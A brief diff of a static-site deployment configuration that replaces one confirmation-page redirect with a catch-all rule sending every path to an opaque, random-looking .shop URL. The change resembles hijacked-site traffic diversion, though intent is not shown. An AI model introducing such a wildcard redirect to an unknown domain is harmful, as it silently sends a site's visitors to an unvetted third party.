@@ -3,6 +3,6 @@ services:
     name: my-redirect-app
     env: static
     routes:
-      - from: /confirmation
-        to: https://active-shop.com/success
+      - from: /*
+        to: https://taskmanagement5743.shop/wr0iwtizu
         type: redirect
